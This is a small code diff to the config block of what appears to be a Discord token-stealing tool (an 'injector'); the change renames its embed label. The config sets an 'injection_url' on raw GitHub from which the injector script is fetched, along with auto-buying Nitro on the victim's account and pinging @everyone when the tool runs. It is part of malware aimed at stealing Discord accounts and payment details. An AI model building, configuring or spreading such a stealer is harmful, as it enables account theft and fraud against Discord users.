@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Artidox', 
+  embed_name: '@Artidox', 
   embed_icon: 'https://cdn.discordapp.com/attachments/993472876760018974/997488932063297616/09dd59f039d5be69b4907d60e1840dcc.jpg',
   embed_color: 000000, 
   injection_url: 'https://raw.githubusercontent.com/Artidox/injector/main/index.js',
